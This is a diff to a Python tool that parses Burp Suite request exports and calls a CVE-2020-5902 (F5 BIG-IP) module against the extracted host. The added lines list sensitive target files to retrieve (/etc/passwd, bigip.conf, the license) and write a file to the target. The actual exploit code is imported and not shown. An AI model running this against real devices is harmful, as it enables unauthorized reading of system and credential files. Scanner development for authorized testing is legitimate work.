@@ -5,8 +5,11 @@ from bs4 import BeautifulSoup
 import argparse
 import base64
 import re
+import requests
+import warnings
+warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 
-from vulnerabilities import *
+from vulnerabilities import CVE_2020_5902
 
 OS = platform.system()
 PythonVersion = platform.python_version()
@@ -39,12 +42,12 @@ def banner():
 
 def main(BurpRequest):
 	try:
-		requests = dict()
+		Requests = dict()
 		XML_BurpRequest = BeautifulSoup(open(BurpRequest).read(), 'html.parser')
-		requests['Host'] = XML_BurpRequest.items.item.host.text 
-		requests['Port'] = XML_BurpRequest.items.item.port.text
-		requests['Protocol'] = XML_BurpRequest.items.item.protocol.text
-		requests['Requests'] = list()
+		Requests['Host'] = XML_BurpRequest.items.item.host.text 
+		Requests['Port'] = XML_BurpRequest.items.item.port.text
+		Requests['Protocol'] = XML_BurpRequest.items.item.protocol.text
+		Requests['Requests'] = list()
 		for req in XML_BurpRequest.items.findAll('request'):
 			headers = base64.b64decode(req.text).decode('utf-8').split('\r\n\r\n')[0]
 			Method, RequestURI, ProtocolVersion = re.findall('([^\s]+) ([^\s]+) ([^\s]+)', headers.split('\r\n')[0])[0]
@@ -61,14 +64,27 @@ def main(BurpRequest):
 
 			MessageBody = base64.b64decode(req.text).decode('utf-8').split('\r\n\r\n')[1]
 
-			requests['Requests'].append({
+			Requests['Requests'].append({
 				'RequestLine': RequestLine,
 				'RequestHeaders': RequestHeaders,
 				'MessageBody': MessageBody
 			})
+
+			requests.get('{}://{}:{}/'.format(Requests['Protocol'], Requests['Host'], Requests['Port']), verify=False, allow_redirects=False)
 	except Exception as e:
 		raise
-	print(requests)
+
+	# CVE_2020_5902.Scan(Requests['Protocol'], Requests['Host'], Requests['Port'])
+	CVE20205902 = CVE_2020_5902.Scan(Requests['Protocol'], Requests['Host'], Requests['Port'])
+	filePath = [
+		'/etc/passwd',
+		'/etc/hosts',
+		'/etc/f5-release',
+		'/config/bigip.license',
+		'/config/bigip.conf',
+		'/tmp/1.txt'
+	]
+	CVE20205902.fileSave('/tmp/ptt.txt', 'CVE-2020-5902')
 
 
 if __name__ == '__main__':
